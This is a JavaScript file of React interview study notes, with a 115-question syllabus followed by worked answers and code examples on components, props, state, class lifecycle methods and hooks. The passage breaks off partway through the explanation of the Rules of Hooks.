/*

MASTER REACT.JS INTERVIEW SYLLABUS  
(All topics structured as QUESTIONS — From Basic → Advanced — Section Wise)

========================================================
SECTION 1 — REACT BASICS & CORE CONCEPTS
========================================================
1. What is React and why is it used?  
2. What problems does React solve?  
3. What is the difference between React and other frameworks like Angular/Vue?  
4. What is JSX and why do we use it?  
5. What is a component in React?  
6. What is the difference between functional and class components?  
7. What are props in React?  
8. What are default props and propTypes?  
9. What is state in React?  
10. What is one-way data binding in React?  

========================================================
SECTION 2 — COMPONENT LIFECYCLE & CLASS COMPONENTS
========================================================
11. What are React lifecycle methods?  
12. What is the mounting phase and which lifecycle methods belong to it?  
13. What is the updating phase?  
14. What is the unmounting phase?  
15. What is componentDidMount and when is it used?  
16. What is shouldComponentUpdate and why use it?  
17. What is getDerivedStateFromProps?  
18. What is componentDidCatch and error boundaries?  
19. How does setState work internally?  
20. What is the difference between setState() and forceUpdate()?  

========================================================
SECTION 3 — FUNCTION COMPONENTS & HOOKS
========================================================
21. What are React Hooks?  
22. What rules must be followed when using hooks?  
23. What is useState and how does state updating work?  
24. What is useEffect and when is it triggered?  
25. What is the difference between useEffect and useLayoutEffect?  
26. What is useRef and what problems does it solve?  
27. What is useMemo and why is memoization important?  
28. What is useCallback and how does it help performance?  
29. What is useContext and how does the Context API work?  
30. What is useReducer and when should you use it over useState?  
31. What is useImperativeHandle?  
32. What is useTransition and when to use concurrent features?  
33. What is useDeferredValue?  

========================================================
SECTION 4 — REACT COMPONENT ARCHITECTURE
========================================================
34. What is component composition?  
35. What is the difference between controlled and uncontrolled components?  
36. What is lifting state up?  
37. What are higher-order components (HOC)?  
38. What are render props?  
39. What is the container–presentational component pattern?  
40. What is the compound component pattern?  
41. What is the provider pattern?  
42. What is the difference between props drilling and context usage?  

========================================================
SECTION 5 — REACT STATE MANAGEMENT
========================================================
43. What is the Context API and when should you use it?  
44. What problems does Redux solve?  
45. What is the Redux data flow and unidirectional architecture?  
46. What are actions, reducers, and the store in Redux?  
47. What is Redux middleware?  
48. What is Redux Thunk and how does asynchronous dispatch work?  
49. What is Redux Saga and how does it differ from Thunk?  
50. What is Zustand, Recoil, or Jotai (modern state managers)?  
51. What is MobX and how does observable state work?  

========================================================
SECTION 6 — REACT ROUTING
========================================================
52. What is React Router?  
53. What is the difference between BrowserRouter and HashRouter?  
54. What are Route and Switch (or Routes in v6)?  
55. What is useNavigate and how do you programmatically navigate?  
56. What are nested routes?  
57. What are protected routes and how do you implement them?  
58. What is code splitting in React Router?  

========================================================
SECTION 7 — FORMS & VALIDATION
========================================================
59. What are controlled components?  
60. What are uncontrolled components?  
61. What is useFormik or Formik library?  
62. What is Yup validation?  
63. What is React Hook Form and why is it performant?  

========================================================
SECTION 8 — PERFORMANCE OPTIMIZATION
========================================================
64. What causes unnecessary re-renders in React?  
65. What is React.memo and when should you use it?  
66. What is memoization in React and how does it work?  
67. What is virtualization and how does react-window or react-virtualized work?  
68. What is the difference between useMemo and useCallback?  
69. How does React batching work?  
70. What is concurrency in React 18?  
71. What is Suspense and how does it help with async rendering?  

========================================================
SECTION 9 — ERROR HANDLING & DEBUGGING
========================================================
72. What are error boundaries?  
73. How does React handle errors in components?  
74. What is componentDidCatch?  
75. How do you debug React applications?  
76. What tools can be used for profiling React performance?  

========================================================
SECTION 10 — REACT DOM & RENDERING
========================================================
77. What is ReactDOM and how does rendering work?  
78. What is reconciliation in React?  
79. What is the virtual DOM and how does it differ from the real DOM?  
80. What is diffing in React?  
81. What is hydration in React?  
82. What is server-side rendering (SSR)?  
83. What is static site generation (SSG)?  
84. What is React Fiber?  

========================================================
SECTION 11 — NEXT.JS & ECOSYSTEM (Optional but Important)
========================================================
85. What is Next.js and why is it used?  
86. What is the difference between SSR, SSG, and ISR in Next.js?  
87. What are API routes in Next.js?  
88. How does file-based routing work?  
89. What are middleware and edge functions?  
90. What is getStaticProps, getServerSideProps, and getStaticPaths?  

========================================================
SECTION 12 — TESTING IN REACT
========================================================
91. What is Jest and how is it used in React?  
92. What is React Testing Library (RTL)?  
93. What is the difference between unit, integration, and E2E testing?  
94. What tools are used for E2E testing (Cypress, Playwright)?  
95. What is snapshot testing?  

========================================================
SECTION 13 — ADVANCED REACT PATTERNS
========================================================
96. What is the uncontrolled component pattern?  
97. What is the controlled component pattern?  
98. What are custom hooks and when should you create one?  
99. What is the pub-sub (observer) pattern in React?  
100. What is the state machine pattern (XState) in React?  
101. What is state colocation and why does it matter?  
102. What is React Portal and when do you use it?  

========================================================
SECTION 14 — SECURITY, DEPLOYMENT & REAL-WORLD USAGE
========================================================
103. What is Cross-Site Scripting (XSS) in React and how do you prevent it?  
104. What is dangerouslySetInnerHTML and why should you avoid it?  
105. What are environment variables in React?  
106. How do you deploy a React app? (Netlify, Vercel, AWS, etc.)  
107. What is code splitting and lazy loading in React?  
108. What is tree shaking in React apps?  

========================================================
SECTION 15 — REACT INTERNALS & ADVANCED MECHANISMS
========================================================
109. What is React Fiber and why was it introduced?  
110. What are lanes in React 18?  
111. How does React schedule rendering updates?  
112. What is the difference between legacy mode and concurrent mode?  
113. How does React handle state batching internally?  
114. What is the role of keys in lists and how does React use them?  
115. Why should keys not be array indices in lists?  

========================================================

*/




/**
1. What is React and why is it used?
--------------------------------------------------

React is a JavaScript library for building user interfaces, created by Facebook. It focuses on building UI as a tree of reusable components rather than as a set of imperative DOM operations.

Key ideas:

- Component-based:
  You build the UI from small, isolated pieces called components, and compose them to form complex interfaces.

- Declarative:
  Instead of manually updating the DOM, you describe what the UI should look like for a given state, and React handles updating the DOM when state changes.

- Virtual DOM:
  React keeps a lightweight in-memory representation of the DOM (the “virtual DOM”). When state changes, it diffs the new virtual tree against the previous one and applies only the minimal required operations to the real DOM. This is usually more efficient and leads to smoother UI updates.

Why it’s used:

1. Reusability:
   Components can be reused across pages and projects, which reduces duplication and bugs.

2. Predictable UI:
   UI is a pure function of state and props: given the same inputs, a component renders the same output. This makes reasoning and testing easier.

3. Ecosystem and tooling:
   Huge ecosystem (React Router, Redux/Zustand, React Query, Next.js, etc.), strong community, and first-class TypeScript support.

4. Cross‑platform:
   The same mental model powers React DOM, React Native, React Native Web, etc.

Basic example:

function Hello() {
  return <h1>Hello, world!</h1>;
}

*/


/**
2. What problems does React solve?
----------------------------------

Before React, UI code in many apps tended to have problems like:

1. Manual DOM manipulation:
   - jQuery-style code scattered everywhere (append, remove, change classes).
   - Hard to keep UI in sync with application state as complexity grows.
   React abstracts this with the virtual DOM and declarative rendering.

2. Spaghetti event handling:
   - Business logic mixed with DOM traversal and event wiring.
   - Hard to reason about “what changes what”.

3. Poor structure for large apps:
   - Global templates and ad-hoc patterns.
   - Hard to reuse UI logic and UI pieces.

React’s solutions:

- Single source of truth for UI:
  The UI is derived from state. You update state; React re-renders and updates DOM correctly.

- Component abstraction:
  Encapsulates markup + behavior + styling (CSS modules / styled-components) inside components, making them easier to test, reuse, and refactor.

- One-way data flow:
  Data flows down from parents to children; changes are propagated predictably, reducing accidental coupling.

*/


/**
3. Difference between React and frameworks like Angular/Vue?
------------------------------------------------------------

High-level comparison (at a conceptual level):

React:
- “Just the View”: Primarily a UI library.
- You pick your own router, state manager, HTTP client, etc.
- Uses JSX for templates.
- Virtual DOM diffing, function components + hooks.

Angular:
- Full framework (routing, DI, HTTP, forms, etc. included).
- Uses TypeScript heavily and a more opinionated architecture.
- Templates in HTML with Angular directives and bindings.
- Two-way binding plus reactive patterns.

Vue:
- Progressive framework.
- Built‑in templates (HTML with directives) and reactivity system.
- Can be used as a simple view layer or full framework (with Vue Router, Vuex/Pinia).
- Single File Components (.vue) by default.

Conceptual differences:

- Opinionation:
  - React: unopinionated about state management, side-effects, folder structure.
  - Angular: strongly opinionated, “batteries included”.
  - Vue: in the middle; more structured than React, less heavy than Angular.

- Learning curve:
  - React: smaller core API, but you need to pick ecosystem pieces.
  - Angular: bigger initial surface (modules, DI, decorators, RxJS).
  - Vue: often considered easy for template‑oriented devs.

- Use cases:
  - React: excellent for large, long-lived apps where fine‑grained architectural control is desired.
  - Angular: enterprise apps where a standardized, full-stack front-end framework is beneficial.
  - Vue: small to medium apps, progressive migration into existing apps, template-friendly environments.

*/


/**
4. What is JSX and why do we use it?
------------------------------------

JSX is a syntax extension for JavaScript that looks like HTML inside JS.

Example:

const element = <h1 className="title">Hello, JSX</h1>;

Under the hood this compiles roughly to:

const element = React.createElement('h1', { className: 'title' }, 'Hello, JSX');

Why it’s used:

1. Better DX (developer experience):
   - Writing UI structure inline with component logic is more ergonomic than concatenating strings or manually calling React.createElement.

2. Co-locating markup with logic:
   - Components often have logic tightly coupled to their UI.
   - JSX lets you use full JS power (conditionals, loops, variables) directly in your “template”.

3. Static analysis and tooling:
   - JSX is compiled; tooling can catch errors early (e.g., missing closing tags, undefined components).

Key JSX details:

- You must use `className` instead of `class`.
- Expressions inside `{}`:
  const name = 'Alice';
  const greeting = <p>Hello, {name}</p>;
- Components must return a single parent element (or `<>...</>` fragment).

*/


/**
5. What is a component in React?
--------------------------------

A component is a reusable, isolated piece of UI that takes inputs (props) and returns React elements describing what should appear on the screen.

Types of components:

- Function components:
  Functions that accept props and return JSX.

  function Greeting(props) {
    return <h1>Hello, {props.name}</h1>;
  }

- Class components (legacy style):
  ES6 classes extending React.Component, with a render() method.

  class Greeting extends React.Component {
    render() {
      return <h1>Hello, {this.props.name}</h1>;
    }
  }

Properties of components:

- Reusable:
  You can render `<Greeting name="Alice" />` in multiple places.

- Composable:
  Components can contain other components:

  function App() {
    return (
      <div>
        <Greeting name="Alice" />
        <Greeting name="Bob" />
      </div>
    );
  }

- Encapsulated:
  Each component manages its own state and logic; external code interacts via props.

*/


/**
6. Difference between functional and class components?
------------------------------------------------------

Historically:

- Class components:
  - Use ES6 classes.
  - State stored in this.state, updated with this.setState().
  - Lifecycle methods: componentDidMount, componentDidUpdate, componentWillUnmount, etc.

  class Counter extends React.Component {
    state = { count: 0 };

    componentDidMount() {
      // side-effects after first render
    }

    componentDidUpdate(prevProps, prevState) {
      // side-effects after updates
    }

    componentWillUnmount() {
      // cleanup
    }

    increment = () => {
      this.setState({ count: this.state.count + 1 });
    };

    render() {
      return (
        <button onClick={this.increment}>
          Count: {this.state.count}
        </button>
      );
    }
  }

- Functional components (with hooks):
  - Just functions that take props and return JSX.
  - Manage state and lifecycle with Hooks (useState, useEffect, useMemo, etc.).

  import { useState, useEffect } from 'react';

  function Counter() {
    const [count, setCount] = useState(0);

    useEffect(() => {
      // runs after render
      return () => {
        // cleanup on unmount
      };
    }, []);

    return (
      <button onClick={() => setCount(c => c + 1)}>
        Count: {count}
      </button>
    );
  }

Key differences (modern React):

- Hooks vs lifecycle methods:
  Functional components use hooks, which are more composable and reduce duplication.
- Simplicity:
  Functional components are usually shorter and easier to read.
- Recommended style:
  Modern React docs recommend functional components + hooks for new code; class components are mostly legacy/maintenance.

Conceptually they are equivalent in capabilities; hooks were introduced to let function components handle state and side effects without classes.

*/


/**
7. What are props in React?
---------------------------

Props (short for “properties”) are read-only inputs passed from a parent component to a child component.

Example:

function Greeting(props) {
  return <h1>Hello, {props.name}</h1>;
}

function App() {
  return (
    <div>
      <Greeting name="Alice" />
      <Greeting name="Bob" />
    </div>
  );
}

Here:

- `name="Alice"` and `name="Bob"` are props passed to the Greeting component.
- Inside Greeting, `props.name` contains the string value.

Core characteristics:

- Read-only:
  A component must not modify its own props.
  If you need to change something, lift state up into a parent and pass a new prop down.

- One-way:
  Data flows from parent → child. Children cannot directly change parent props; they can call callbacks passed as props:

  function Parent() {
    const [value, setValue] = useState('');

    return (
      <Child
        value={value}
        onChange={newValue => setValue(newValue)}
      />
    );
  }

  function Child({ value, onChange }) {
    return (
      <input
        value={value}
        onChange={e => onChange(e.target.value)}
      />
    );
  }

- Used for configuration:
  Components can behave differently based on props (labels, colors, callbacks, etc.).

*/


/**
8. What are default props and propTypes?
----------------------------------------

Default props:

Default props provide fallback values when a prop isn’t supplied.

Function components (modern pattern):

function Button({ label = 'Click me', color = 'blue' }) {
  return <button style={{ color }}>{label}</button>;
}

<Button />                // label = "Click me", color = "blue"
<Button label="Save" />   // label = "Save", color = "blue"

Older pattern (defaultProps):

function Button(props) {
  return <button style={{ color: props.color }}>{props.label}</button>;
}

Button.defaultProps = {
  label: 'Click me',
  color: 'blue',
};

PropTypes:

PropTypes is a runtime type-checking mechanism for props in development.

Usage:

import PropTypes from 'prop-types';

function UserCard({ name, age, isAdmin }) {
  return (
    <div>
      <h2>{name}</h2>
      <p>Age: {age}</p>
      {isAdmin && <span>Admin</span>}
    </div>
  );
}

UserCard.propTypes = {
  name: PropTypes.string.isRequired,
  age: PropTypes.number,
  isAdmin: PropTypes.bool,
};

UserCard.defaultProps = {
  age: 18,
  isAdmin: false,
};

Benefits:

- Catch bugs early (e.g., passing a string where a number is expected).
- Serve as lightweight documentation for component API.

In TypeScript projects, compile-time typing often replaces or supplements PropTypes.

*/


/**
9. What is state in React?
--------------------------

State is mutable data managed by a component that affects what is rendered. When state changes, React re-renders the component (and its children) to reflect the new UI.

In function components:

import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0); // state variable + setter

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(c => c + 1)}>
        Increment
      </button>
    </div>
  );
}

In class components:

class Counter extends React.Component {
  state = { count: 0 };

  increment = () => {
    this.setState(prev => ({ count: prev.count + 1 }));
  };

  render() {
    return (
      <div>
        <p>Count: {this.state.count}</p>
        <button onClick={this.increment}>
          Increment
        </button>
      </div>
    );
  }
}

Key points:

- State vs props:
  - Props: external inputs, read-only from the component’s perspective.
  - State: internal data, owned and modified by the component.

- Asynchronous updates:
  State updates are batched; don’t rely on the old value directly, use functional updates when needed (`setCount(c => c + 1)`).

- Local vs global:
  State can be local to a component, or lifted up to a shared parent, or managed in an external store (Redux, Zustand, etc.) for global app state.

- Triggers re-render:
  Calling setState/useState setter causes React to re-run the component and reconcile UI.

*/


/**
10. What is one-way data binding in React?
------------------------------------------

React uses one-way (unidirectional) data flow: data goes from parent → child via props, and never directly in the opposite direction.

Mechanism:

- Parent holds state.
- Parent passes data and callbacks to children as props.
- Child calls callbacks to *request* state changes in parent.
- Parent updates state and re-renders, passing updated data down again.

Example:

function Parent() {
  const [text, setText] = useState('');

  const handleChange = (value) => {
    setText(value);
  };

  return (
    <div>
      <p>Current: {text}</p>
      <Child value={text} onChange={handleChange} />
    </div>
  );
}

function Child({ value, onChange }) {
  return (
    <input
      value={value}
      onChange={e => onChange(e.target.value)}
    />
  );
}

Explanation:

- `Parent` owns the `text` state.
- `Child` receives the current value and a callback `onChange`.
- When the user types, `Child` calls `onChange`, passing the new value.
- `Parent` updates its state; the new value flows down again as a prop.
- Data always flows downward; changes propagate upward only through callbacks, not by mutating parent state directly.

Benefits of one-way data binding:

1. Predictability:
   - You can trace any piece of data to a single owner.
   - Easier debugging: when UI is wrong, check the component that owns the state.

2. Easier mental model:
   - UI = f(state, props).
   - No hidden bidirectional bindings that can cause unexpected feedback loops.

3. Better performance:
   - React can optimize re-renders knowing exactly where state lives and how it changes.

Contrast with two-way binding (like classic AngularJS):

- In two-way binding, a form input might directly update a model which automatically re-updates the view, sometimes leading to hard-to-trace dependencies.
- In React, this is always explicit through controlled components.

*/



/**
11. What are React lifecycle methods?
-------------------------------------

React lifecycle methods are special methods on class components that run at specific points
in a component’s life: when it is created (mount), updated (re-render), and removed
(unmount).

Main lifecycle groups (class components):

Mounting (first time in the DOM):
- constructor
- static getDerivedStateFromProps
- render
- componentDidMount

Updating (when props/state change):
- static getDerivedStateFromProps
- shouldComponentUpdate
- render
- getSnapshotBeforeUpdate
- componentDidUpdate

Unmounting (removed from DOM):
- componentWillUnmount

Error handling:
- static getDerivedStateFromError
- componentDidCatch

In modern React, function components use Hooks (useEffect, useLayoutEffect, etc.) to
express the same lifecycle concepts without classes.
*/


/**
12. What is the mounting phase and which lifecycle methods belong to it?
------------------------------------------------------------------------

Mounting is the phase where a component is created and inserted into the DOM for the very
first time.

Order for class components:

1) constructor(props)
   - Initialize state, bind methods, set up initial instance fields.
   - Avoid side effects here.

2) static getDerivedStateFromProps(props, state)
   - Rarely used; derive state from props before render if needed.
   - Must be pure and return new state or null.

3) render()
   - Returns React elements (JSX) describing the UI.
   - Pure: no side effects, same output for same props/state.

4) componentDidMount()
   - Runs once after the initial render has been committed to the DOM.
   - Good place for:
     - Fetching data
     - Subscribing to events
     - Measuring DOM
     - Initializing third‑party libraries

Example:

class UserProfile extends React.Component {
  constructor(props) {
    super(props);
    this.state = { user: null, loading: true };
  }

  async componentDidMount() {
    const res = await fetch(`/api/users/${this.props.id}`);
    const user = await res.json();
    this.setState({ user, loading: false });
  }

  render() {
    if (this.state.loading) return <p>Loading...</p>;
    return <h1>{this.state.user.name}</h1>;
  }
}
*/


/**
13. What is the updating phase?
-------------------------------

The updating phase happens whenever a mounted component re-renders due to:

- New props from its parent.
- Internal state changes via setState.
- A forced update via forceUpdate.

For class components, the typical update sequence:

1) static getDerivedStateFromProps(nextProps, prevState)
   - Optional; can adjust state based on new props.

2) shouldComponentUpdate(nextProps, nextState)
   - Decide whether to re-render.
   - Return false to skip render and subsequent lifecycle methods for this update.

3) render()
   - Produce the next UI based on new props/state.

4) getSnapshotBeforeUpdate(prevProps, prevState)
   - Called right before DOM changes are committed.
   - Used to capture information like scroll position before it changes.
   - Its return value is passed to componentDidUpdate.

5) componentDidUpdate(prevProps, prevState, snapshot)
   - Runs after DOM has been updated.
   - Good for side effects that depend on prop/state changes:
     - Fetch new data when an ID changes.
     - Adjust scroll based on snapshot.
   - Must guard against infinite loops before calling setState again.

Example:

class Chat extends React.Component {
  componentDidUpdate(prevProps) {
    if (prevProps.roomId !== this.props.roomId) {
      // room changed, fetch new messages
      this.fetchMessages();
    }
  }

  fetchMessages() { / * ... * / }

  render() { / * ... * / }
}
*/


/**
14. What is the unmounting phase?
---------------------------------

Unmounting is the phase where a component is removed from the DOM and destroyed.

Class components have one main lifecycle method here:

- componentWillUnmount()
  - Called right before the component is unmounted.
  - Used for cleanup:
    - Clear timers/intervals
    - Cancel network requests
    - Remove event listeners
    - Unsubscribe from stores/WebSockets

Example:

class Clock extends React.Component {
  state = { now: new Date() };

  componentDidMount() {
    this.timerId = setInterval(() => {
      this.setState({ now: new Date() });
    }, 1000);
  }

  componentWillUnmount() {
    clearInterval(this.timerId); // prevent memory leaks
  }

  render() {
    return <p>{this.state.now.toLocaleTimeString()}</p>;
  }
}
*/


/**
15. What is componentDidMount and when is it used?
--------------------------------------------------

componentDidMount is a lifecycle method that runs once, immediately after a component is
mounted (inserted into the DOM) and its initial render is committed.

Signature:
componentDidMount() {}

Uses:

1) Data fetching:
   - Call APIs, then setState with fetched data.

2) Subscriptions:
   - WebSockets, event emitters, window/document event listeners.

3) DOM interactions:
   - Measure elements (getBoundingClientRect).
   - Initialize charts, maps, or other libraries that require a real DOM node.

4) One‑time setup:
   - Start timers/intervals, set up observers.

Important notes:

- Safe to call setState here; React will trigger a second render, but the user sees the
  initial UI quickly and then updated UI.
- Runs only on mount, not on subsequent updates.

Example:

class TodoList extends React.Component {
  state = { todos: [], loading: true };

  async componentDidMount() {
    const res = await fetch('/api/todos');
    const todos = await res.json();
    this.setState({ todos, loading: false });
  }

  render() {
    if (this.state.loading) return <p>Loading...</p>;
    return (
      <ul>
        {this.state.todos.map(t => <li key={t.id}>{t.text}</li>)}
      </ul>
    );
  }
}
*/


/**
16. What is shouldComponentUpdate and why use it?
-------------------------------------------------

shouldComponentUpdate lets you control whether a component should re-render in response
to changes in props or state.

Signature:
shouldComponentUpdate(nextProps, nextState) {
  // return true to re-render, false to skip
}

Default behavior:
- If you don’t define it, React re-renders the component on every state/prop change.

Why use it:

1) Performance optimization:
   - If rendering is expensive or the subtree is large, avoid unnecessary renders by
     comparing current props/state to nextProps/nextState.

2) Fine-grained control:
   - Skip updates when changes don’t affect visible output.

Example:

class PureCounter extends React.Component {
  shouldComponentUpdate(nextProps) {
    // re-render only when value actually changes
    return nextProps.value !== this.props.value;
  }

  render() {
    console.log('rendering counter');
    return <div>{this.props.value}</div>;
  }
}

Modern alternative:
- React.PureComponent automatically implements shallow prop/state comparison.
- In function components, use React.memo for similar behavior.

*/


/**
17. What is getDerivedStateFromProps?
-------------------------------------

getDerivedStateFromProps is a static lifecycle method used to derive state from props in a
controlled way.

Signature:
static getDerivedStateFromProps(nextProps, prevState) {
  // return an object to update state, or null to do nothing
}

Characteristics:

- Runs before every render:
  - On initial mount and on subsequent updates.
- Static and pure:
  - No access to `this`.
  - Must not cause side effects.
- Intended for rare use cases:
  - Keeping state in sync with props (e.g., controlled/uncontrolled hybrid patterns).
  - Replacing some legacy uses of componentWillReceiveProps.

Example (simplified controlled input mirror):

class SyncedInput extends React.Component {
  state = { value: '' };

  static getDerivedStateFromProps(nextProps, prevState) {
    if (nextProps.value != null && nextProps.value !== prevState.value) {
      return { value: nextProps.value };
    }
    return null;
  }

  render() {
    return <input value={this.state.value} readOnly />;
  }
}

Cautions:

- Overuse leads to complex, hard‑to‑reason state logic.
- Often better to:
  - Derive data in render, or
  - Lift state up, or
  - Use memoization instead of duplicating props into state.

*/


/**
18. What is componentDidCatch and error boundaries?
---------------------------------------------------

componentDidCatch is a lifecycle method used in error boundaries to catch JavaScript
errors in child components’ render, lifecycle methods, and constructors.

Error boundary:
- A React component that catches errors below it in the tree and displays a fallback UI
  instead of crashing the entire app.

Two key pieces:

1) static getDerivedStateFromError(error)
   - Update state so the next render shows a fallback UI.

2) componentDidCatch(error, info)
   - Side effects like logging error details to an error reporting service.

Example:

class ErrorBoundary extends React.Component {
  state = { hasError: false };

  static getDerivedStateFromError(error) {
    // update state so fallback UI is shown
    return { hasError: true };
  }

  componentDidCatch(error, info) {
    // log error, send to monitoring, etc.
    console.error('ErrorBoundary caught an error', error, info);
  }

  render() {
    if (this.state.hasError) {
      return <h2>Something went wrong.</h2>;
    }
    return this.props.children;
  }
}

// Usage:
<ErrorBoundary>
  <SomeComponent />
</ErrorBoundary>;

What they catch:
- Errors in render, lifecycle methods, constructors of children.

What they do NOT catch:
- Event handlers (you handle those yourself with try/catch).
- Asynchronous code outside React (e.g. setTimeout callbacks, raw promises).
- Server-side rendering errors.

*/


/**
19. How does setState work internally?
--------------------------------------

setState is the primary way to schedule state updates in class components. In function
components, the equivalent is the setter returned by useState.

Key internal behaviors (conceptual):

1) Asynchronous and batched:
   - Inside React events, multiple setState calls may be batched into one update for
     performance.
   - You shouldn’t rely on this.state having the updated value immediately after calling
     setState.

2) Partial updates (class components):
   - You can pass an object that will be shallow‑merged into the current state:

     this.setState({ count: this.state.count + 1 });

   - Or pass an updater function:

     this.setState(prevState => ({ count: prevState.count + 1 }));

3) Scheduling a re-render:
   - When setState is called, React queues an update.
   - React reconciles the new state with the previous state, re-runs render, diffs the
     virtual DOM, and applies minimal changes to the real DOM.

4) Functional updates:
   - Recommended when the new state depends on previous state or props:

     this.setState(prev => ({ count: prev.count + 1 }));

   - Avoids bugs caused by batched/asynchronous updates.

5) In function components:
   - useState gives you [state, setState].
   - Calling the setter schedules a re-render.
   - If you pass the same value, React may bail out and skip a full re-render.

Example (class):

class Counter extends React.Component {
  state = { count: 0 };

  incrementTwiceWrong = () => {
    // Might only increment once, because both see the same this.state
    this.setState({ count: this.state.count + 1 });
    this.setState({ count: this.state.count + 1 });
  };

  incrementTwiceRight = () => {
    // Correct: each update uses the previous result
    this.setState(prev => ({ count: prev.count + 1 }));
    this.setState(prev => ({ count: prev.count + 1 }));
  };

  render() {
    return (
      <button onClick={this.incrementTwiceRight}>
        Count: {this.state.count}
      </button>
    );
  }
}

Conceptually, React maintains an internal queue of updates, merges them, computes the new
state, and then re-renders.
*/


/**
20. Difference between setState() and forceUpdate()
---------------------------------------------------

Both cause re-renders, but they differ in intent and behavior.

setState(partialState or updater):

- What it does:
  - Schedules a state update.
  - Merges the provided partial state (class components) into existing state.
  - Triggers the normal update lifecycle:
    - getDerivedStateFromProps
    - shouldComponentUpdate
    - render
    - getSnapshotBeforeUpdate
    - componentDidUpdate

- Recommended use:
  - Normal way to update UI in response to events, data, etc.
  - Keeps state as the “source of truth” for what the UI should look like.

forceUpdate():

- What it does:
  - Forces a re-render of the component, skipping shouldComponentUpdate.
  - Doesn’t modify this.state.
  - Triggers render and componentDidUpdate for that component and its children.

- When to use (rare):
  - If the UI depends on something *outside* React’s state/props that has changed and you
    can’t or don’t want to move it into state (e.g., a mutable object, external global).
  - Even then, it’s usually better to model that data inside state or props.

Example:

class Clock extends React.Component {
  // BAD example, but illustrates forceUpdate
  tick() {
    // time stored outside state
    this.time = new Date();
    this.forceUpdate(); // force re-render
  }

  render() {
    return <span>{this.time.toLocaleTimeString()}</span>;
  }
}

Key differences:

- Data model:
  - setState: updates component state, which the UI derives from.
  - forceUpdate: does NOT update state; it just re-renders with whatever data is currently
    in instance fields/props.

- Lifecycle:
  - setState: respects shouldComponentUpdate (can skip render).
  - forceUpdate: bypasses shouldComponentUpdate and always renders.

- Best practice:
  - Use setState (or hook setters) for almost all updates.
  - Treat forceUpdate as an escape hatch; if you need it frequently, reconsider your
    state management design.

*/





/**
21. What are React Hooks?
--------------------------

React Hooks are functions that let you "hook into" React features (state, lifecycle, 
context, etc.) from function components. They were introduced in React 16.8 to allow 
function components to do everything class components could do, with cleaner syntax.

Before Hooks (class components):

class Counter extends React.Component {
  state = { count: 0 };
  
  componentDidMount() {
    document.title = `Count: ${this.state.count}`;
  }
  
  componentDidUpdate() {
    document.title = `Count: ${this.state.count}`;
  }
  
  render() {
    return (
      <button onClick={() => this.setState({ count: this.state.count + 1 })}>
        {this.state.count}
      </button>
    );
  }
}

After Hooks (function components):

import { useState, useEffect } from 'react';

function Counter() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    document.title = `Count: ${count}`;
  }, [count]);
  
  return (
    <button onClick={() => setCount(count + 1)}>
      {count}
    </button>
  );
}

Built-in Hooks:

State Hooks:
- useState: add state to function components
- useReducer: manage complex state with reducer pattern

Effect Hooks:
- useEffect: side effects after render (data fetching, subscriptions, DOM updates)
- useLayoutEffect: synchronous effects before browser paint

Ref Hooks:
- useRef: persist values across renders without causing re-renders, access DOM elements

Performance Hooks:
- useMemo: memoize expensive calculations
- useCallback: memoize functions to prevent child re-renders

Context Hook:
- useContext: consume context values

Additional Hooks:
- useImperativeHandle: customize instance value exposed to parent via ref
- useDebugValue: display custom label in React DevTools
- useId: generate unique IDs for accessibility
- useTransition: mark state updates as low-priority transitions
- useDeferredValue: defer updating a value to keep UI responsive

Why Hooks?

1. Simpler code:
   - No classes, no `this`, no binding methods.
   - Easier to understand and write.

2. Reusable logic:
   - Custom hooks let you extract component logic into reusable functions.
   
   function useWindowWidth() {
     const [width, setWidth] = useState(window.innerWidth);
     
     useEffect(() => {
       const handleResize = () => setWidth(window.innerWidth);
       window.addEventListener('resize', handleResize);
       return () => window.removeEventListener('resize', handleResize);
     }, []);
     
     return width;
   }
   
   function MyComponent() {
     const width = useWindowWidth(); // reuse across components
     return <p>Width: {width}</p>;
   }

3. Better composition:
   - Hooks compose better than HOCs and render props.
   - Avoid "wrapper hell" in component trees.

4. Co-located related logic:
   - Instead of splitting logic across lifecycle methods, hooks group related code together.

Hooks vs Class Components:

Feature               | Class Components          | Function Components + Hooks
----------------------|---------------------------|-----------------------------
State                 | this.state, setState      | useState, useReducer
Lifecycle             | componentDidMount, etc.   | useEffect, useLayoutEffect
Side effects          | componentDidMount/Update  | useEffect
Context               | this.context, Consumer    | useContext
Refs                  | createRef                 | useRef
Performance           | shouldComponentUpdate     | React.memo, useMemo, useCallback
Code complexity       | Higher (classes, this)    | Lower (functions)
Reusable logic        | HOCs, render props        | Custom hooks

Modern React strongly recommends function components with hooks for new code.
*/


/**
22. What rules must be followed when using hooks?
-------------------------------------------------

Hooks have strict rules to ensure they work correctly. These are called the "Rules of Hooks."

Rule 1: Only call hooks at the top level
-----------------------------------------

DON'T call hooks inside:
- Conditionals (if/else)
- Loops (for, while, map)
- Nested functions

Why? React relies on the order hooks are called to track their state between renders.

BAD ❌:

function BadExample({ isLoggedIn }) {
  if (isLoggedIn) {
    const [user, setUser] = useState(null); // ❌ Conditional hook!
  }
  
  const [count, setCount] = useState(0);
  
  return <div>...</div>;
}

Problem: On first render, React sees 2 hooks. After login, React sees 1 hook. 
Order is inconsistent → state gets confused.

GOOD ✅:

function GoodExample({ isLoggedIn }) {
  const [user, setUser] = useState(null); // ✅ Always called
  const [count, setCount] = useState(0);   // ✅ Always called
  
  if (!isLoggedIn) {
    return <div>Please log in</div>;
  }
  
  return <div>...</div>;
}

Rule 2: Only call hooks from React functions
---------------------------------------------

Call hooks from:
✅ Function components
✅ Custom hooks (functions starting with "use")

Don't call from:
❌ Regular JavaScript functions
❌ Class components
❌ Event handlers (directly)

BAD ❌:

function regularFunction() {
  const [state, setState] = useState(0); // ❌ Not a React component or hook
}

class MyClass extends React.Component {
  render() {
    const [state, setState] = useState(0); // ❌ Can't use hooks in classes
    return <div>...</div>;
  }
}

function MyComponent() {
  const handleClick = () => {
    const [clicked, setClicked] = useState(false); // ❌ Hook in event handler
  };
  
  return <button onClick={handleClick}>Click</button>;
}

GOOD ✅:

// ✅ Function component
function MyComponent() {
  const [state, setState] = useState(0);
  
  const handleClick = () => {
    setState(prev => prev + 1); // ✅ Using state setter from top level
  };
  
  return <button onClick={handleClick}>Click</button>;
}

// ✅ Custom hook
function useCustomHook() {
  const [state, setState] = useState(0);
  return [state, setState];
}

Why these rules?

Internal implementation:
React stores hooks in a linked list per component instance. The order hooks are called 
determines which state corresponds to which hook. Breaking the order breaks this tracking.

Conceptually:

First render:
